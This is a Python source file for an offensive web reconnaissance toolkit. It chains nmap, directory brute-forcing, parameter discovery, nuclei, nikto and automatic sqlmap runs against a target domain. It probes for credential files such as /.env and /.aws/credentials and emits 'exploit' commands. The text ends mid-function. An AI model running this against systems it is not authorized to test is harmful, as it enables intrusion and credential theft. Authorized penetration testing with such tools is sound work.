#!/usr/bin/env python3
"""
RToolkit Kali-Pro v2.0 — Deep Kali Linux Scanner
Mengintegrasikan tools Kali Linux untuk scanning dan enumeration mendalam:
nuclei, dirsearch, ffuf, paramspider, whatweb, nmap, subfinder, httpx, sqlmap, nikto
+ Advanced Parameter Discovery: endpoints-extractor, Arjun, x8

Output: Tabel hasil scanning + payload exploit untuk setiap kerentanan
"""

import os, sys, json, subprocess, tempfile, datetime, re, shutil, time, signal
from pathlib import Path
from urllib.parse import urlparse, quote

# Colors
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; N = "\033[0m"; DIM = "\033[2m"; BOLD = "\033[1m"

RESULTS_DIR = Path("kali_results")
REPORT = {
    "target": "", "timestamp": "",
    "technologies": [],
    "directories": [],
    "parameters": [],
    "vulnerabilities": [],   # {url, name, severity, detail, exploit_cmd}
    "open_ports": [],
    "subdomains": [],
    "summary": {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
}

SEVERITY_COLORS = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": B, "INFO": C}

def c(text, color):
    return f"{color}{text}{N}"

def banner():
    os.system('clear')
    print(f"""{R}
╔══════════════════════════════════════════════════════════════╗
║{W}  ██████╗ ████████╗ ██████╗  ██████╗ ██╗  ██╗██╗     ██╗████████╗{R} ║
║{W}  ██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║ ██╔╝██║     ██║╚══██╔══╝{R} ║
║{W}  ██████╔╝   ██║   ██║   ██║██║   ██║█████╔╝ ██║     ██║   ██║   {R} ║
║{W}  ██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   {R} ║
║{W}  ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   {R} ║
║{W}  ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   {R} ║
║{Y}  Kali-Pro v2.0 — nuclei | dirsearch | ffuf | Arjun | x8 | endpoints{R} ║
╚══════════════════════════════════════════════════════════════╝{N}""")

def check_tools():
    """Check which Kali tools are installed."""
    tools = {
        "nuclei": False, "dirsearch": False, "ffuf": False, "whatweb": False,
        "nmap": False, "subfinder": False, "httpx": False, "nikto": False,
        "sqlmap": False, "paramspider": False, "gobuster": False, "wpscan": False,
        "arjun": False, "x8": False, "endpoints_extractor": False,
    }
    print(f"\n  {c('[+] Checking Kali Tools', G)}")

    # Standard tools via shutil.which
    for tool in ["nuclei", "dirsearch", "ffuf", "whatweb", "nmap", "subfinder",
                  "httpx", "nikto", "sqlmap", "paramspider", "gobuster", "wpscan",
                  "arjun", "x8"]:
        path = shutil.which(tool)
        available = path is not None
        tools[tool] = available
        icon = c("✓", G) if available else c("✗", R)
        print(f"    {icon} {tool}")

    # endpoints-extractor (Bash script, check by filename)
    ep_found = False
    ep_path_final = None
    for ep_name in ["find_urls_endpoints.sh", "endpoints-extractor/find_urls_endpoints.sh"]:
        if shutil.which(ep_name):
            ep_found = True
            ep_path_final = shutil.which(ep_name)
            break
        if Path(ep_name).exists():
            ep_found = True
            ep_path_final = str(Path(ep_name).resolve())
            break
    # Also check common locations
    for ep_dir in ["/usr/local/bin", "/usr/bin", os.getcwd(), os.path.dirname(os.path.abspath(__file__))]:
        candidate = Path(ep_dir) / "find_urls_endpoints.sh"
        if candidate.exists():
            ep_found = True
            ep_path_final = str(candidate.resolve())
            break
    if ep_found and ep_path_final:
        tools["endpoints_extractor"] = ep_path_final
    icon = c("✓", G) if ep_found else c("✗", R)
    print(f"    {icon} endpoints-extractor")

    return tools

def run_cmd(cmd, timeout=120, desc=""):
    """Run a shell command and return (stdout, stderr, success)."""
    if desc:
        print(f"  {c(f'→ {desc}', C)}")
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return proc.stdout, proc.stderr, proc.returncode == 0
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", False
    except Exception as e:
        return "", str(e), False

def print_table(headers, rows, title=None, color=C):
    """Print formatted table."""
    if not rows:
        return
    col_widths = [len(h) + 2 for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            clean = re.sub(r'\x1b\[[0-9;]*m', '', str(cell))
            col_widths[i] = max(col_widths[i], len(clean) + 2)
    sep = '+' + '+'.join('─' * w for w in col_widths) + '+'
    if title:
        print(f"\n  {c(title, color)}")
    print(f"  {c(sep, DIM)}")
    hdr = ' │ '.join(h.center(col_widths[i]) for i, h in enumerate(headers))
    print(f"  {c('│', DIM)} {hdr} {c('│', DIM)}")
    print(f"  {c(sep, DIM)}")
    for row in rows:
        cells = []
        for i, cell in enumerate(row):
            cell_s = str(cell)
            clean = re.sub(r'\x1b\[[0-9;]*m', '', cell_s)
            pad = col_widths[i] - len(clean) - 2
            cells.append(cell_s + ' ' * pad)
        print(f"  {c('│', DIM)} {' │ '.join(cells)} {c('│', DIM)}")
    print(f"  {c(sep, DIM)}")

# ============ PHASE 1: RECONNAISSANCE ============

def phase_recon(domain):
    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 1: RECONNAISSANCE', BOLD)}")
    print(f"{c('='*65, Y)}")

    target_ip = ""
    try:
        import socket
        target_ip = socket.gethostbyname(domain)
        print(f"\n  {c('[+] Target IP:', G)} {c(target_ip, W)}")
    except:
        print(f"  {c('[!] Could not resolve domain', R)}")

    # 1a. nmap port scan
    tools_available = check_tools()
    if tools_available["nmap"]:
        print(f"\n  {c('[+] Nmap Port Scan', G)}")
        stdout, _, ok = run_cmd(
            f"nmap -sS -sV -T4 --top-ports 100 --open -oN {RESULTS_DIR}/nmap.txt {domain}",
            300, "nmap SYN scan on top 100 ports"
        )
        if ok and stdout:
            ports = []
            for line in stdout.split('\n'):
                m = re.search(r'^(\d+)/tcp\s+open\s+(\S+)', line)
                if m:
                    port_num = m.group(1)
                    service = m.group(2)
                    ports.append([c(port_num, W), c(service, G)])
                    REPORT["open_ports"].append(f"{port_num}/tcp ({service})")
            if ports:
                print_table(["Port", "Service"], ports, "[OPEN PORTS]")
            # Save full output
            with open(f"{RESULTS_DIR}/nmap.txt", 'w') as f:
                f.write(stdout)
    else:
        print(f"  {c('  ✗ nmap not installed, skipping port scan', R)}")

    # 1b. whatweb tech detection
    if tools_available["whatweb"]:
        print(f"\n  {c('[+] WhatWeb Technology Detection', G)}")
        stdout, _, ok = run_cmd(
            f"whatweb -a 3 --log-json={RESULTS_DIR}/whatweb.json {domain}",
            120, "whatweb technology fingerprinting"
        )
        if ok and stdout:
            techs = []
            for line in stdout.split('\n'):
                line = line.strip()
                if line and '[' in line:
                    techs.append([c(line[:100], W), c(line[100:120] if len(line) > 100 else "", DIM)])
                    # Parse technologies
                    for t in re.findall(r'(\w[\w+]*)\[([^\]]+)\]', line):
                        REPORT["technologies"].append(f"{t[0]}: {t[1]}")
            if not techs:
                techs.append([c(stdout.strip()[:120], W), ""])
            print_table(["Fingerprint", ""], techs, "[TECHNOLOGIES]")
    else:
        print(f"  {c('  ✗ whatweb not installed', R)}")

    # 1c. subdomain discovery
    if tools_available["subfinder"]:
        print(f"\n  {c('[+] Subfinder Subdomain Discovery', G)}")
        stdout, _, ok = run_cmd(
            f"subfinder -d {domain} -silent -o {RESULTS_DIR}/subdomains.txt",
            120, "subfinder passive subdomain enum"
        )
        if ok and stdout:
            subs = stdout.strip().split('\n')
            sub_table = []
            for s in subs[:30]:
                s = s.strip()
                if s:
                    sub_table.append([c(s, W)])
                    REPORT["subdomains"].append(s)
            if sub_table:
                print_table(["Subdomain"], sub_table, f"[SUBDOAINS ({len(subs)} found, showing 30)]")

    # 1d. httpx probing
    if tools_available["httpx"] and REPORT["subdomains"]:
        print(f"\n  {c('[+] Httpx HTTP Probing', G)}")
        stdout, _, ok = run_cmd(
            f"httpx -l {RESULTS_DIR}/subdomains.txt -silent -status-code -title -o {RESULTS_DIR}/httpx.txt",
            120, "httpx probing live subdomains"
        )
        if ok and stdout:
            live = []
            for line in stdout.strip().split('\n'):
                parts = line.split()
                if parts:
                    live.append([c(parts[0][:60], G) if '200' in line else c(parts[0][:60], Y), " ".join(parts[1:])[:60]])
            if live:
                print_table(["URL", "Info"], live, "[LIVE HOSTS]")

    return tools_available


# ============ PHASE 2: DIRECTORY ENUMERATION ============

def phase_directories(domain, tools):
    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 2: DIRECTORY & FILE ENUMERATION', BOLD)}")
    print(f"{c('='*65, Y)}")

    url = f"https://{domain}"

    # 2a. dirsearch
    if tools.get("dirsearch"):
        print(f"\n  {c('[+] Dirsearch Web Path Discovery', G)}")
        stdout, _, ok = run_cmd(
            f"dirsearch -u {url} -w /usr/share/wordlists/dirb/common.txt "
            f"-e php,asp,aspx,txt,conf,db,sql,bak,zip,tar,log,json -t 50 "
            f"--format plain -o {RESULTS_DIR}/dirsearch.txt 2>/dev/null",
            300, "dirsearch directory bruteforce"
        )
        if stdout:
            dirs = []
            seen_urls = set()
            for line in stdout.split('\n'):
                if any(s in line.lower() for s in ['200', '301', '302', '401', '403', '500']):
                    parts = line.strip().split()
                    if parts:
                        u = parts[-1]
                        status = parts[-2] if len(parts) >= 2 else ""
                        if u and u not in seen_urls:
                            seen_urls.add(u)
                            sz = len(u)
                            sc = G if status in ['200', '301', '302'] else Y
                            dirs.append([c(status, sc), c(u[:80], W)])
                            REPORT["directories"].append({"url": u, "status": status})
            if dirs:
                print_table(["Status", "URL"], dirs[:25], f"[DIRS FOUND ({len(dirs)} total, showing 25)]")

    # 2b. ffuf for deeper paths
    if tools.get("ffuf"):
        print(f"\n  {c('[+] Ffuf Deep Content Discovery', G)}")
        stdout, _, ok = run_cmd(
            f"ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "
            f"-t 80 -c -o {RESULTS_DIR}/ffuf.json -of json -s 2>/dev/null",
            300, "ffuf FUZZ on medium wordlist"
        )
        # Parse ffuf JSON output
        ffuf_file = RESULTS_DIR / "ffuf.json"
        if ffuf_file.exists():
            try:
                data = json.loads(ffuf_file.read_text())
                ffuf_results = []
                for r in data.get("results", []):
                    status = r.get("status", 0)
                    if status in [200, 301, 302, 401, 403]:
                        ffuf_results.append([c(str(status), G if status in [200, 301, 302] else Y),
                                            c(r.get("url", "")[:80], W)])
                        REPORT["directories"].append({"url": r.get("url", ""), "status": status})
                if ffuf_results:
                    print_table(["Status", "URL"], ffuf_results[:20], f"[FFUF PATHS ({len(ffuf_results)} total, showing 20)]")
            except: pass

    # 2c. gobuster (fallback)
    if tools.get("gobuster") and not tools.get("dirsearch"):
        print(f"\n  {c('[+] Gobuster Directory Bruteforce', G)}")
        stdout, _, ok = run_cmd(
            f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt "
            f"-t 50 -l -o {RESULTS_DIR}/gobuster.txt 2>/dev/null",
            300, "gobuster directory bruteforce"
        )
        if stdout:
            dirs = []
            for line in stdout.split('\n'):
                m = re.search(r'^/(\S+)\s+\(Status:\s*(\d+)\)', line)
                if m:
                    path = "/" + m.group(1)
                    status = m.group(2)
                    sc = G if status in ['200', '301', '302'] else Y
                    dirs.append([c(status, sc), c(f"{url}{path}", W)])
                    REPORT["directories"].append({"url": f"{url}{path}", "status": int(status)})
            if dirs:
                print_table(["Status", "URL"], dirs[:25], f"[GOBUSTER ({len(dirs)} found, showing 25)]")


# ============ PHASE 3: PARAMETER DISCOVERY ============

def phase_parameters(domain, tools):
    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 3: PARAMETER DISCOVERY', BOLD)}")
    print(f"{c('='*65, Y)}")

    url = f"https://{domain}"

    # 3a. paramspider
    if tools.get("paramspider"):
        print(f"\n  {c('[+] ParamSpider Parameter Discovery', G)}")
        stdout, _, ok = run_cmd(
            f"paramspider -d {domain} --level high -o {RESULTS_DIR}/params.txt 2>/dev/null",
            180, "paramspider crawling for parameters"
        )
        params_file = RESULTS_DIR / "params.txt"
        if params_file.exists():
            content = params_file.read_text()
            params = []
            seen = set()
            for line in content.split('\n'):
                line = line.strip()
                if line and line not in seen:
                    seen.add(line)
                    params.append([c(line[:100], W)])
                    # Extract parameter names
                    parsed = urlparse(line)
                    if parsed.query:
                        for param in parsed.query.split('&'):
                            pname = param.split('=')[0]
                            if pname not in REPORT["parameters"]:
                                REPORT["parameters"].append(pname)
            if params:
                print_table(["URL with Parameters"], params[:20], f"[PARAMS ({len(params)} found, showing 20)]")

    # 3b. ffuf parameter fuzzing
    if tools.get("ffuf"):
        print(f"\n  {c('[+] Ffuf Parameter Fuzzing', G)}")
        # Try common params on main page
        common_params = ["id", "page", "q", "s", "search", "cat", "file", "load",
                        "action", "do", "exec", "cmd", "template", "include", "path"]
        found_params = []
        for p in common_params[:10]:
            stdout, _, _ = run_cmd(
                f"ffuf -u '{url}?{p}=FUZZ' -w /usr/share/wordlists/dirb/common.txt "
                f"-t 50 -c -s -mr 'error|warning|notice|sql|exception|stack' 2>/dev/null",
                120, f"fuzzing parameter: {p}"
            )
            if stdout and len(stdout.strip()) > 0:
                found_params.append([c(p, G), c("Reflected/Error detected", R)])
                if p not in REPORT["parameters"]:
                    REPORT["parameters"].append(p)
        if found_params:
            print_table(["Parameter", "Finding"], found_params, "[POTENTIALLY VULNERABLE PARAMS]")


# ============ PHASE 3b: ADVANCED PARAMETER DISCOVERY ============

def phase_params_advanced(domain, tools):
    """Run endpoints-extractor, Arjun, and x8 for deep hidden parameter discovery."""
    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 3b: ADVANCED PARAMETER DISCOVERY', BOLD)}")
    print(f"  {c('  endpoints-extractor + Arjun + x8', DIM)}")
    print(f"{c('='*65, Y)}")

    url = f"https://{domain}"
    all_endpoints = []
    x8_wordlist = "/usr/share/wordlists/dirb/common.txt"

    # ---------- endpoints-extractor: Extract URLs/Endpoints from HTML/JS ----------
    ep_tool = tools.get("endpoints_extractor")
    if ep_tool:
        print(f"\n  {c('[+] Endpoints-Extractor: URL/Endpoint Extraction', G)}")
        ep_sh = ep_tool if isinstance(ep_tool, str) and Path(ep_tool).exists() else "find_urls_endpoints.sh"
        stdout, stderr, ok = run_cmd(
            f"bash {ep_sh} -u {url} -s {RESULTS_DIR}/endpoints.txt 2>/dev/null",
            120, "extracting endpoints from HTML/JS/JSON"
        )
        ep_file = RESULTS_DIR / "endpoints.txt"
        if ep_file.exists():
            content = ep_file.read_text().strip()
            endpoints = [l.strip() for l in content.split('\n') if l.strip()]
            if endpoints:
                ep_rows = []
                for ep in endpoints[:30]:
                    ep_rows.append([c(ep[:90], W)])
                    all_endpoints.append(ep)
                    # Extract params from endpoint URLs
                    parsed = urlparse(ep)
                    if parsed.query:
                        for param in parsed.query.split('&'):
                            pname = param.split('=')[0]
                            if pname not in REPORT["parameters"]:
                                REPORT["parameters"].append(pname)
                print_table(["Endpoint URL"], ep_rows, f"[ENDPOINTS ({len(endpoints)} found, showing 30)]")

    # ---------- Arjun: HTTP Parameter Discovery Suite ----------
    if tools.get("arjun"):
        print(f"\n  {c('[+] Arjun: HTTP Parameter Discovery', G)}")
        print(f"    {c('Scanning with 25,890+ parameter wordlist...', DIM)}")

        # Arjun on main URL
        stdout, _, ok = run_cmd(
            f"arjun -u {url} --get --passive -oJ -oT {RESULTS_DIR}/arjun.txt 2>/dev/null",
            180, "arjun parameter discovery (GET + passive sources)"
        )
        arjun_file = RESULTS_DIR / "arjun.txt"
        arjun_params = []
        if arjun_file.exists():
            content = arjun_file.read_text()
            for line in content.split('\n'):
                line = line.strip()
                if line and '=' in line:
                    pname = line.split('=')[0].strip()
                    if pname and pname not in REPORT["parameters"]:
                        REPORT["parameters"].append(pname)
                        arjun_params.append([c(pname, G), c(f"{url}?{pname}=<value>", W)])
        # Also try to parse JSON output
        arjun_json = RESULTS_DIR / "arjun.json"
        if arjun_json.exists():
            try:
                data = json.loads(arjun_json.read_text())
                if isinstance(data, dict):
                    for endpoint, params in data.items():
                        if isinstance(params, list):
                            for p in params:
                                if p not in REPORT["parameters"]:
                                    REPORT["parameters"].append(p)
                                    arjun_params.append([c(p, G), c(f"{endpoint}?{p}=<value>", W)])
            except: pass

        if not arjun_params:
            # Fallback: parse stdout
            for line in stdout.split('\n'):
                m = re.search(r'\[\+\] Found:\s*(\S+)', line)
                if m:
                    pname = m.group(1).strip()
                    if pname and pname not in REPORT["parameters"]:
                        REPORT["parameters"].append(pname)
                        arjun_params.append([c(pname, G), c(f"{url}?{pname}=<value>", W)])

        if arjun_params:
            print_table(["Parameter", "Example URL"], arjun_params, f"[ARJUN PARAMS ({len(arjun_params)} found)]")
        else:
            print(f"    {c('No parameters discovered by Arjun', Y)}")

        # Arjun on discovered endpoints (first 5)
        if all_endpoints:
            print(f"\n    {c('Scanning discovered endpoints with Arjun...', DIM)}")
            for ep in all_endpoints[:5]:
                stdout, _, _ = run_cmd(
                    f"arjun -u {ep} --get -oJ 2>/dev/null",
                    120, f"arjun on endpoint: {ep[:50]}..."
                )
                for line in stdout.split('\n'):
                    m = re.search(r'\[\+\]\s*Found:\s*(\S+)', line)
                    if m:
                        pname = m.group(1).strip()
                        if pname and pname not in REPORT["parameters"]:
                            REPORT["parameters"].append(pname)
                            print(f"    {c(f'  ✓ {pname} @ {ep}', G)}")

    # ---------- x8: Hidden Parameter Fuzzer (Rust) ----------
    if tools.get("x8"):
        print(f"\n  {c('[+] x8: Hidden Parameter Fuzzer', G)}")
        print(f"    {c('High-accuracy parameter discovery via page comparison...', DIM)}")

        # Check if wordlist exists
        x8_wl = x8_wordlist
        if not Path(x8_wl).exists():
            x8_wl = str(RESULTS_DIR / "params_wordlist.txt")
            # Create a minimal wordlist if needed
            if not Path(x8_wl).exists():
                basic_params = ["id","page","q","s","search","cat","file","load","action",
                               "do","exec","cmd","template","include","path","debug","test",
                               "admin","config","token","key","secret","pass","user","email",
                               "lang","ref","redirect","url","site","dir","folder","name",
                               "type","view","show","edit","delete","create","update","get",
                               "order","sort","limit","offset","start","end","date","time",
                               "filter","query","search","term","keyword","input","output",
                               "return","callback","format","method","mode","option","option",
                               "pageNum","pageNumber","page_no","record","records","result",
                               "results","per_page","items","data","value","values","enable",
                               "disable","hide","visible","read","write","upload","download"]
                RESULTS_DIR.mkdir(exist_ok=True)
                with open(x8_wl, 'w') as f:
                    f.write('\n'.join(basic_params))

        # x8 on main URL
        stdout, _, ok = run_cmd(
            f"x8 -u '{url}' -w {x8_wl} --follow-redirects -O json -o {RESULTS_DIR}/x8_output.json 2>/dev/null",
            180, "x8 hidden parameter fuzzing on main URL"
        )

        # Parse x8 JSON output
        x8_params = []
        x8_file = RESULTS_DIR / "x8_output.json"
        if x8_file.exists():
            try:
                data = json.loads(x8_file.read_text())
                if isinstance(data, list):
                    for entry in data:
                        param = entry.get("param", "")
                        param_url = entry.get("url", url)
                        param_method = entry.get("method", "GET")
                        if param and param not in REPORT["parameters"]:
                            REPORT["parameters"].append(param)
                            x8_params.append([c(param, G), c(param_url[:70], W), c(param_method, DIM)])
                elif isinstance(data, dict):
                    for param, info in data.items():
                        if param and param not in REPORT["parameters"]:
                            REPORT["parameters"].append(param)
                            ep_url = info.get("url", url) if isinstance(info, dict) else url
                            x8_params.append([c(param, G), c(ep_url[:70], W), c("GET", DIM)])
            except: pass

        # Also try x8 on discovered endpoints
        if all_endpoints:
            ep_file_list = RESULTS_DIR / "x8_targets.txt"
            with open(ep_file_list, 'w') as f:
                for ep in all_endpoints[:10]:
                    f.write(ep + '\n')
            stdout2, _, _ = run_cmd(
                f"x8 -u '{ep_file_list}' -w {x8_wl} --follow-redirects -O json 2>/dev/null",
                180, "x8 on discovered endpoints"
            )
            for line in stdout2.split('\n'):
                try:
                    d = json.loads(line.strip())
                    param = d.get("param", "")
                    if param and param not in REPORT["parameters"]:
                        REPORT["parameters"].append(param)
                        x8_params.append([c(param, G), c(d.get("url", url)[:70], W), c("GET", DIM)])
                except: pass

        if x8_params:
            print_table(["Parameter", "URL", "Method"], x8_params, f"[X8 PARAMS ({len(x8_params)} found)]")
        else:
            print(f"    {c('No hidden parameters discovered by x8', Y)}")

        # Save combined parameter list
        param_file = RESULTS_DIR / "all_parameters.txt"
        with open(param_file, 'w') as f:
            for p in sorted(set(REPORT["parameters"])):
                f.write(f"{p}\n")
        total_unique = len(set(REPORT["parameters"]))
        print(f"    {c(f'Total unique params: {total_unique}', C)}")

    # ---------- Auto-Feed: Test discovered params for injection ----------
    if REPORT["parameters"]:
        print(f"\n  {c('[+] Auto-Feed: Testing discovered parameters for injection', G)}")

        # Build test URLs with discovered params
        test_params = list(set(REPORT["parameters"]))[:15]  # Top 15 unique params

        # 1. Test with nuclei using custom param fuzzing
        if tools.get("nuclei"):
            print(f"    {c('Feeding params to nuclei for injection testing...', DIM)}")
            for p in test_params[:5]:
                test_url = f"{url}?{p}=1"
                stdout, _, _ = run_cmd(
                    f"nuclei -u '{test_url}' -tags fuzz,injection -silent -json 2>/dev/null",
                    120, f"nuclei testing param: {p}"
                )
                for line in stdout.split('\n'):
                    try:
                        d = json.loads(line.strip())
                        if d:
                            matched = d.get("matched-at", d.get("url", ""))
                            name = d.get("info", {}).get("name", "Injection")
                            sev = d.get("info", {}).get("severity", "medium").upper()
                            REPORT["vulnerabilities"].append({
                                "url": matched, "name": f"{name} (via {p})",
                                "severity": sev,
                                "detail": f"Parameter: {p}",
                                "exploit_cmd": f"curl -s '{matched}'"
                            })
                    except: pass

        # 2. Auto SQLMap on discovered params
        if tools.get("sqlmap") and test_params:
            sqli_params = [p for p in test_params if p.lower() in
                          ["id","page","q","s","search","cat","file","load","action",
                           "exec","cmd","order","sort","limit","offset","dir","query",
                           "term","keyword","input","output","callback","record","items"]]
            if sqli_params:
                print(f"    {c('Auto-feeding params to SQLMap for SQLi testing...', DIM)}")
                for p in sqli_params[:3]:
                    stdout, _, ok = run_cmd(
                        f"sqlmap -u '{url}?{p}=1' --batch --level 2 --risk 1 "
                        f"--output-dir={RESULTS_DIR}/sqlmap_params 2>/dev/null",
                        180, f"sqlmap on discovered param: {p}"
                    )
                    if stdout and ("vulnerable" in stdout.lower() or "identified" in stdout.lower()):
                        for line in stdout.split('\n'):
                            if "Parameter:" in line:
                                REPORT["vulnerabilities"].append({
                                    "url": f"{url}?{p}=1",
                                    "name": f"SQL Injection via discovered param: {p}",
                                    "severity": "CRITICAL",
                                    "detail": line.strip(),
                                    "exploit_cmd": f"sqlmap -u '{url}?{p}=1' --batch --dbs"
                                })
                                print(f"    {c(f'  ⚡ SQLi via discovered param: {p}!', R)}")


# ============ PHASE 4: VULNERABILITY SCANNING ============

def phase_vuln_scan(domain, tools):
    print(f"\n{c('='*65, Y)}")
    print(f"  {c('PHASE 4: VULNERABILITY SCANNING', BOLD)}")
    print(f"{c('='*65, Y)}")

    url = f"https://{domain}"

    # 4a. nuclei scan
    if tools.get("nuclei"):
        print(f"\n  {c('[+] Nuclei Vulnerability Scanner', G)}")

        # Critical/High severity templates first
        for severity, label in [("critical", "CRITICAL"), ("high", "HIGH"), ("medium", "MEDIUM")]:
            print(f"\n  {c(f'  Scanning for {label.upper()} vulnerabilities...', C)}")
            stdout, _, ok = run_cmd(
                f"nuclei -u {url} -severity {severity} -silent -json -o {RESULTS_DIR}/nuclei_{severity}.json 2>/dev/null",
                300, f"nuclei {label} severity templates"
            )
            # Parse JSON output
            nuc_file = RESULTS_DIR / f"nuclei_{severity}.json"
            if nuc_file.exists():
                findings = nuc_file.read_text().strip().split('\n')
                vuln_table = []
                for line in findings:
                    try:
                        data = json.loads(line)
                        vuln_url = data.get("matched-at", data.get("url", ""))
                        vuln_name = data.get("info", {}).get("name", "Unknown")
                        sev = data.get("info", {}).get("severity", "medium").upper()
                        ext_ref = data.get("info", {}).get("reference", "")
                        curl_cmd = f"curl -s '{vuln_url}'"

                        # Build exploit payload
                        exploit = f"# Exploit: {vuln_name}\n{curl_cmd}"
                        if ext_ref:
                            exploit += f"\n# Reference: {ext_ref}"

                        color = SEVERITY_COLORS.get(sev, W)
                        vuln_table.append([
                            c(vuln_name[:50], color),
                            c(sev, color),
                            c(vuln_url[:70], W),
                            c(exploit[:80], DIM)
                        ])
                        REPORT["vulnerabilities"].append({
                            "url": vuln_url, "name": vuln_name,
                            "severity": sev, "detail": data,
                            "exploit_cmd": curl_cmd
                        })
                    except:
                        pass
                if vuln_table:
                    print_table(["Vulnerability", "Severity", "URL", "Exploit/Ref"], vuln_table,
                               f"[NUCLEI {label.upper()} FINDINGS]")

        # Run all-severity scan too
        print(f"\n  {c('  Full nuclei scan (all templates)...', C)}")
        stdout, _, ok = run_cmd(
            f"nuclei -u {url} -silent -json -o {RESULTS_DIR}/nuclei_all.json 2>/dev/null",
            300, "nuclei all severity scan"
        )
        nuc_all = RESULTS_DIR / "nuclei_all.json"
        if nuc_all.exists():
            findings = nuc_all.read_text().strip().split('\n')
            for line in findings:
                try:
                    data = json.loads(line)
                    sev = data.get("info", {}).get("severity", "info").upper()
                    vuln_url = data.get("matched-at", data.get("url", ""))
                    vuln_name = data.get("info", {}).get("name", "Unknown")

                    # Deduplicate
                    existing = [v for v in REPORT["vulnerabilities"] if v["url"] == vuln_url and v["name"] == vuln_name]
                    if not existing:
                        REPORT["vulnerabilities"].append({
                            "url": vuln_url, "name": vuln_name,
                            "severity": sev, "detail": data,
                            "exploit_cmd": f"curl -s '{vuln_url}'"
                        })
                except:
                    pass

    # 4b. nikto scan
    if tools.get("nikto"):
        print(f"\n  {c('[+] Nikto Web Server Scan', G)}")
        stdout, _, ok = run_cmd(
            f"nikto -h {url} -Format json -output {RESULTS_DIR}/nikto.json 2>/dev/null",
            300, "nikto web server vulnerability scan"
        )
        nikto_file = RESULTS_DIR / "nikto.json"
        if nikto_file.exists():
            try:
                data = json.loads(nikto_file.read_text())
                nikto_items = []
                for item in data if isinstance(data, list) else data.get("items", []):
                    if isinstance(item, dict):
                        vuln_url = item.get("url", url)
                        vuln_msg = item.get("message", item.get("description", ""))
                        nikto_items.append([c(vuln_msg[:60], Y), c(vuln_url[:80], W), c("MANUAL", DIM)])
                        REPORT["vulnerabilities"].append({
                            "url": vuln_url, "name": vuln_msg[:80],
                            "severity": "MEDIUM", "detail": vuln_msg,
                            "exploit_cmd": f"# Manual check required\ncurl -v '{vuln_url}'"
                        })
                if nikto_items:
                    print_table(["Finding", "URL", "Exploit"], nikto_items[:15], "[NIKTO FINDINGS]")
            except: pass

    # 4c. Check .env, .git, config files
    print(f"\n  {c('[+] Critical File Exposure Check', G)}")
    sensitive_paths = [
        "/.env", "/.git/config", "/.git/HEAD", "/admin/.env", "/backup/.env",
        "/phpinfo.php", "/info.php", "/wp-content/debug.log", "/wp-config.php.bak",
        "/config.php", "/database.yml", "/dump.sql", "/backup.sql", "/.htaccess",
        "/server-status", "/.aws/credentials", "/.azure/access.json",
        "/.gitlab-ci.yml", "/Jenkinsfile", "/Dockerfile", "/docker-compose.yml",
        "/terraform.tfstate", "/s3.yml", "/.s3cfg", "/storage/logs/laravel.log",
    ]
    import requests, urllib3
    urllib3.disable_warnings()
    exposed = []
    for path in sensitive_paths:
        try:
            r = requests.get(f"{url}{path}", timeout=3, verify=False, allow_redirects=False,
                           headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code in [200, 401, 403]:
                body_lower = r.text.lower()
                # Skip WAF block pages
                if "request rejected" in body_lower and len(r.text) < 500:
                    continue
                exposed.append([
                    c("EXPOSED", R) if r.status_code == 200 else c("RESTRICTED", Y),
                    c(path, W),
                    c(str(r.status_code), G if r.status_code == 200 else Y),
                    c(f"{len(r.text)}B", DIM)
                ])
                sev = "CRITICAL" if r.status_code == 200 else "HIGH"
                REPORT["vulnerabilities"].append({
                    "url": f"{url}{path}", "name": f"Sensitive File: {path}",
                    "severity": sev, "detail": f"HTTP {r.status_code}, {len(r.text)} bytes",
                    "exploit_cmd": f"curl -s '{url}{path}'"
                })
        except: pass
    if exposed:
        print_table(["Status", "Path", "HTTP", "Size"], exposed, "[SENSITIVE FILE EXPOSURE]")

    # 4d. wpscan (if WordPress detected)
    has_wp = any("WordPress" in t for t in REPORT["technologies"])
    if tools.get("wpscan") and has_wp:
        print(f"\n  {c('[+] WPScan WordPress Vulnerability Scan', G)}")
        stdout, _, ok = run_cmd(
            f"wpscan --url {url} --no-update --format json -o {RESULTS_DIR}/wpscan.json 2>/dev/null",
            300, "wpscan WordPress vulnerability scan"
        )
        wpscan_file = RESULTS_DIR / "wpscan.json"
        if wpscan_file.exists():
            try:
                data = json.loads(wpscan_file.read_text())
                wp_vulns = []
                for vuln_type in ["vulnerabilities", "plugin_vulnerabilities", "theme_vulnerabilities"]:
                    for v in data.get(vuln_type, []):
                        if isinstance(v, dict):
                            vuln_name = v.get("title", v.get("name", "Unknown"))
                            fixed_in = v.get("fixed_in", "N/A")
                            wp_vulns.append([
                                c(vuln_name[:55], R),
                                c(f"Fixed: {fixed_in}" if fixed_in != "N/A" else "No fix", Y),
                                c("wpscan --url URL --plugins-detection aggressive", DIM)
                            ])
                            REPORT["vulnerabilities"].append({
                                "url": url, "name": f"WP: {vuln_name}",
                                "severity": "HIGH", "detail": f"Fixed in: {fixed_in}",
                                "exploit_cmd": f"# {vuln_name}\n# Fixed in: {fixed_in}"
                            })
                if wp_vulns:
                    print_table(["Vulnerability", "Details", "Remediation"], wp_vulns[:10], "[WP VULNS]")
            except: pass

    # 4e. SQLMap (if SQLi suspected)
    sql_params = [p for p in REPORT["parameters"] if p.lower() in ["id", "page", "q", "s", "search", "cat", "file", "load", "action", "exec", "cmd"]]
